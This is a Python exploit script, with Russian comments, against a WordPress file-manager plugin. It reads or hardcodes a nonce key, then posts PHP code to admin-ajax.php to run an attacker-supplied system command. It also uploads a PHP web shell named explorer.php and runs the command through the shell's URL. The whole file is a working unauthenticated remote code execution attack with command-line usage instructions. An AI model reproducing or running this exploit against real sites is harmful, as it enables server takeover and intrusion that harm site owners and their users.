import requests
import sys
import re

PROCESS = "\033[1;34;40m[*]\033[0m"
SUCCESS = "\033[1;32;40m[+]\033[0m"
FAIL = "\033[1;31;40m[-]\033[0m"

# Используем ваш fmakey напрямую (нужно отыскать на сайте, в коде страницы и поменять значение)
FMAKEY = "70c79bd2b1" 

if len(sys.argv) < 3:
    print(f'Use: {sys.argv[0]} IP_PATH COMMAND')
    print(f'Example: {sys.argv[0]} 10.124.1.233/library "whoami"')
    sys.exit(1)

IP_PATH = sys.argv[1]
COMMAND = sys.argv[2]

# Полный путь к сайту
url = f'http://{IP_PATH}/'
print(f"{PROCESS} Target: {url}")

# Пробуем получить fmakey из страницы (или используем заранее известный)
try:
    r = requests.get(url, timeout=5)
    raw_fmakey = r.text
    # Ищем fmakey в разных форматах
    fmakey_match = re.search(r"_fmakey['\"]?\s*:\s*['\"]?(\d+)['\"]?", raw_fmakey)
    if fmakey_match:
        fmakey = fmakey_match.group(1)
        print(f"{SUCCESS} Found fmakey: {fmakey}")
    else:
        fmakey = FMAKEY
        print(f"{PROCESS} Using predefined fmakey: {fmakey}")
except:
    fmakey = FMAKEY
    print(f"{PROCESS} Using predefined fmakey: {fmakey}")

print(f'{PROCESS} Exploiting Unauthenticated Remote Code Execution via AJAX!')
ajax_url = f"http://{IP_PATH}/wp-admin/admin-ajax.php"
print(f"{PROCESS} Sending AJAX request to: {ajax_url}")

# Пробуем оба возможных action
actions_to_try = ['fpd_uploadimage', 'fma_load_shortcode_fma_ui']

for action in actions_to_try:
    print(f"{PROCESS} Trying action: {action}")
    
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryI52DGCOt37rixRS1"
    }
    
    data = f"""------WebKitFormBoundaryI52DGCOt37rixRS1
Content-Disposition: form-data; name="action"

{action}
------WebKitFormBoundaryI52DGCOt37rixRS1
Content-Disposition: form-data; name="_fmakey"

{fmakey}
------WebKitFormBoundaryI52DGCOt37rixRS1
Content-Disposition: form-data; name="phpcode"

<?php system('{COMMAND}'); ?>
------WebKitFormBoundaryI52DGCOt37rixRS1--"""

    try:
        r = requests.post(ajax_url, headers=headers, data=data, timeout=10)
        
        print(f"{PROCESS} Response status: {r.status_code}")
        
        # Проверяем разные возможные ответы
        if r.status_code == 200:
            if "err" in r.text.lower():
                print(f"{FAIL} Error in response: {r.text[:100]}")
            elif len(r.text.strip()) > 0:
                print(f"{SUCCESS} Possible success! Response: {r.text[:500]}")
                # Попробуем выполнить команду напрямую
                break
            else:
                print(f"{PROCESS} Empty response, trying next action...")
        else:
            print(f"{FAIL} HTTP {r.status_code}")
            
    except Exception as e:
        print(f"{FAIL} Error: {e}")

# Также попробуем прямой метод из оригинальной уязвимости
print(f"\n{PROCESS} Trying original exploit method...")

data2 = f"""------WebKitFormBoundaryI52DGCOt37rixRS1
Content-Disposition: form-data; name="reqid"

1
------WebKitFormBoundaryI52DGCOt37rixRS1
Content-Disposition: form-data; name="cmd"

upload
------WebKitFormBoundaryI52DGCOt37rixRS1
Content-Disposition: form-data; name="target"

l1_Lw
------WebKitFormBoundaryI52DGCOt37rixRS1
Content-Disposition: form-data; name="action"

fma_load_shortcode_fma_ui
------WebKitFormBoundaryI52DGCOt37rixRS1
Content-Disposition: form-data; name="_fmakey"

{fmakey}
------WebKitFormBoundaryI52DGCOt37rixRS1
Content-Disposition: form-data; name="path"


------WebKitFormBoundaryI52DGCOt37rixRS1
Content-Disposition: form-data; name="upload[]"; filename="explorer.php"
Content-Type: text/x-php

<?php system($_GET['cmd']);?>
------WebKitFormBoundaryI52DGCOt37rixRS1--"""

try:
    r2 = requests.post(ajax_url, headers=headers, data=data2, timeout=10)
    print(f"{PROCESS} Original method response: {r2.status_code}")
    if r2.status_code == 200:
        print(f"{PROCESS} Response preview: {r2.text[:200]}")
        
        # Пробуем найти URL загруженного файла
        import json
        try:
            response_json = json.loads(r2.text)
            if "added" in response_json:
                for item in response_json["added"]:
                    if "url" in item:
                        webshell_url = item["url"]
                        print(f"{SUCCESS} Webshell uploaded at: {webshell_url}")
                        
                        # Выполняем команду через webshell
                        cmd_url = f"{webshell_url}?cmd={COMMAND}"
                        r3 = requests.get(cmd_url, timeout=10)
                        print(f"{SUCCESS} Command output: {r3.text}")
        except:
            pass
except Exception as e:
    print(f"{FAIL} Error in original method: {e}")
